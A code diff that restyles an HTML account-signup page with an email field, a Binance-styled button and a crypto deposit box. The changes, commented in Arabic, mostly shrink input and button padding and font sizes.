@@ -9,28 +9,59 @@
 <link href="https://googleapis.com/css2?family=Changa:wght@400;600;700;800&display=swap" rel="stylesheet">
 <style>
 body { font-family:'Changa',sans-serif !important; background-color:#000000 !important; color:#ffffff !important; text-align:center; padding:40px 20px; margin:0; }
-.card { background-color:#000000 !important; padding:35px 25px; border-radius:20px; display:inline-block; width:100%; max-width:380px; box-shadow:0 10px 25px rgba(0,0,0,0.5); border:1px solid #3d2f75; box-sizing:border-box; }
+.card { background-color:#000000 !important; padding:35px 25px; border-radius:20px; display:inline-block; width:100%; max-width:380px; box-shadow:0 10px 25px rgba(0,0,0,0.5); border: 1px solid #3d2f75; box-sizing:border-box; }
 .brand { font-family:'Changa',sans-serif !important; font-size:36px; font-weight:800; margin-bottom:10px; letter-spacing:1px; }
 .subtitle { font-family:'Changa',sans-serif !important; color:#a29bfe; font-size:15px; font-weight:600; margin-bottom:20px; }
-.amount-tag { font-family:'Changa',sans-serif !important; background-color:#1e1b4b; border:1px dashed #6c5ce7; padding:12px; border-radius:10px; font-size:18px; font-weight:700; color:#00ffcc; margin-bottom:25px; }
-.input-group { margin-bottom:20px; text-align:right; }
-label { font-family:'Changa',sans-serif !important; display:block; margin-bottom:10px; color:#ffffff; font-size:16px; font-weight:700; text-align:left; direction:ltr; }
-input[type="text"] { font-family:'Changa',sans-serif !important; width:100%; padding:12px; border-radius:10px; border:1px solid #ffffff; background-color:#ffffff !important; color:#000000 !important; box-sizing:border-box; font-size:15px; direction:ltr; font-weight:600; outline:none; }
+.amount-tag { font-family:'Changa',sans-serif !important; background-color:#1e1b4b; border: 1px dashed #6c5ce7; padding:12px; border-radius:10px; font-size:18px; font-weight:700; color:#00ffcc; margin-bottom:25px; }
+.input-group { margin-bottom: 15px; text-align: right; }
+label { font-family:'Changa',sans-serif !important; display:block; margin-bottom:8px; color:#ffffff; font-size:15px; font-weight:700; text-align:left; direction:ltr; }
+
+/* تم تصغير حجم البادينغ والخط هنا للمربعات البيضاء لتصبح أصغر وأرتب */
+input[type="text"] { 
+    font-family:'Changa',sans-serif !important; 
+    width: 100%; 
+    padding: 10px 12px; /* تصغير الارتفاع الداخلي */
+    border-radius: 8px; 
+    border: 1px solid #ffffff; 
+    background-color: #ffffff !important; 
+    color: #000000 !important; 
+    box-sizing: border-box; 
+    font-size: 14px; /* تصغير مقاس الخط */
+    direction: ltr; 
+    font-weight: 600; 
+    outline: none; 
+}
 input[type="text"]::placeholder { color:#7f8c8d !important; opacity:1; }
 
-/* ضبط وتأمين درجات اللون الأخضر لتتناسب مع النص الأبيض */
 @keyframes greenGlowPulse { 
     0% { background-color:#009473; box-shadow:0 0 12px rgba(0, 148, 115, 0.6); } 
     50% { background-color:#00cc99; box-shadow:0 0 25px rgba(0, 204, 153, 0.9); } 
     100% { background-color:#009473; box-shadow:0 0 12px rgba(0, 148, 115, 0.6); } 
 }
 
-/* تنسيق زر CREATE ACCOUNT العريض والواضح جداً باللون الأبيض */
-.submit-btn-pulse { font-family:'Changa',sans-serif !important; width:100%; padding:14px; color:#ffffff !important; border:none; border-radius:8px; font-weight:800 !important; font-size:22px !important; letter-spacing:1px; cursor:pointer; box-sizing:border-box; animation:greenGlowPulse 2s infinite ease-in-out; transition:0.2s; margin-top:20px; display:block; text-shadow: 1px 1px 3px rgba(0,0,0,0.5); }
-.submit-btn-pulse:hover { transform:scale(1.02); }
+/* تم تصغير حجم زر CREATE ACCOUNT ليصبح متناسقاً تماماً ومريحاً للعين */
+.submit-btn-pulse { 
+    font-family:'Changa',sans-serif !important; 
+    width: 100%; 
+    padding: 11px; /* تصغير الارتفاع الداخلي للزر */
+    color: #ffffff !important; 
+    border: none; 
+    border-radius: 8px; 
+    font-weight: 800 !important; 
+    font-size: 19px !important; /* تصغير حجم النص البرمجي للزر */
+    letter-spacing: 0.5px; 
+    cursor: pointer; 
+    box-sizing: border-box; 
+    animation: greenGlowPulse 2s infinite ease-in-out; 
+    transition: 0.2s; 
+    margin-top: 15px; 
+    display: block; 
+    text-shadow: 1px 1px 3px rgba(0,0,0,0.5); 
+}
+.submit-btn-pulse:hover { transform: scale(1.02); }
 
 .binance-btn-final { font-family:'Changa',sans-serif !important; width:100%; padding:14px; color:#000000 !important; border:none; border-radius:8px; font-weight:700; font-size:15px; cursor:pointer; display:block; text-decoration:none; margin-bottom:12px; box-sizing:border-box; animation:greenGlowPulse 2s infinite ease-in-out; transition:0.2s; }
-.binance-btn-final:hover { transform:scale(1.02); }
+.binance-btn-final:hover { transform: scale(1.02); }
 .manual-deposit-box { margin-top:25px; padding:15px; border:2px dashed #6c5ce7; border-radius:8px; background-color:#ffffff; text-align:center; box-shadow:0 5px 15px rgba(255,255,255,0.05); box-sizing:border-box; }
 .crypto-address-container { font-family:'Changa',sans-serif !important; width:100%; padding:12px 10px; text-align:center; background:#f1f2f6; color:#2f3542; border:1px solid #ced6e0; border-radius:6px; font-size:14px; font-weight:700; direction:ltr; white-space:normal; word-break:break-all; box-sizing:border-box; margin-top:5px; }
 .check-account-btn { font-family:'Changa',sans-serif !important; width:100%; padding:12px; background:transparent; color:#a29bfe; border:1px dashed #4a3f85; border-radius:8px; font-weight:600; font-size:14px; margin-top:15px; margin-bottom:5px; cursor:pointer; transition:0.3s; box-sizing:border-box; display:block; }
@@ -56,7 +87,6 @@ input[type="text"]::placeholder { color:#7f8c8d !important; opacity:1; }
 <label for="username">Email Address</label>
 <input type="text" id="username" placeholder="example@gmail.com" required>
 </div>
-<!-- تم تحديث نص الزر هنا إلى الإنجليزية CREATE ACCOUNT -->
 <button type="button" onclick="goToStep2()" class="submit-btn-pulse">CREATE ACCOUNT</button>
 <button type="button" onclick="alertNoAccount()" class="check-account-btn">هل لديك حساب مسبقاً؟</button>
 <div class="footer-info-box">
